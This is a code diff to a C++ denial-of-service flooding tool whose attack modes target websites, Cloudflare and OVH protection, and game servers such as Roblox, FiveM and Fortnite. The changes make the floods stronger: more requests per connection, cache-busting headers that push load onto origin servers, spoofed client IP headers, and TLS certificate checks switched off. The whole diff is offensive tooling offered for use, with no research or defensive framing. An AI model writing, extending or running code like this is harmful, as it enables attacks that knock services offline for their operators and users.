@@ -36,6 +36,7 @@ static void parse_url(const std::string &url_in, std::string &host, std::string 
     size_t scheme_pos = url.find("://");
     if (scheme_pos != std::string::npos) {
         std::string scheme = url.substr(0, scheme_pos);
+        for (auto &c : scheme) c = std::tolower(c);
         if (scheme == "https") default_port = 443;
         else if (scheme == "http") default_port = 80;
         url = url.substr(scheme_pos + 3);
@@ -371,9 +372,14 @@ static void worker_https(const std::string &method, SSL_CTX *ctx, const std::str
                                "X-Real-IP: " + fake_ip + "\r\n";
                     }
 
+                    if (method == "cache") {
+                        req += "Cache-Control: no-cache, no-store, must-revalidate\r\n"
+                               "Pragma: no-cache\r\n";
+                    }
+
                     req += "\r\n";
 
-                    int cycles = (method == "rapidflood" || method == "tlsx") ? 15 : 1;
+                    int cycles = (method == "rapidflood" || method == "tlsx" || method == "httpx") ? 20 : 5;
                     for (int i = 0; i < cycles && g_running.load(std::memory_order_relaxed); ++i) {
                         if (SSL_write(ssl, req.c_str(), (int)req.size()) <= 0) break;
                         g_total_packets.fetch_add(1, std::memory_order_relaxed);
@@ -448,13 +454,16 @@ int main(int argc, char *argv[]) {
     SSL_load_error_strings();
     const SSL_METHOD *ssl_method = TLS_client_method();
     SSL_CTX *ssl_ctx = SSL_CTX_new(ssl_method);
+    if (ssl_ctx) {
+        SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
+    }
 #else
     void *ssl_ctx = nullptr;
 #endif
 
     std::vector<std::thread> thread_pool;
 
-    bool is_https = (method == "https" || method == "tls" || method == "tlsx" || (port == 443 && (method == "browser" || method == "cache" || method == "bypass" || method == "cloudflare")));
+    bool is_https = (method == "https" || method == "tls" || method == "tlsx" || port == 443 || (raw_target.rfind("https://", 0) == 0));
     bool is_http = (method == "http" || method == "httpx" || method == "rapidflood" || method == "browser" || method == "cache" || method == "bypass" || method == "cloudflare");
     bool is_game = (method == "game" || method == "rainbow" || method == "rocket" || method == "roblox" || method == "fivem" || method == "pubg" || method == "fortnite" || method == "warthunder" || method == "counter" || method == "samp");
     bool is_tcp = (method == "tcp" || method == "socket" || method == "ovh" || method == "tcpmix" || method == "tcpbypass" || method == "ack");
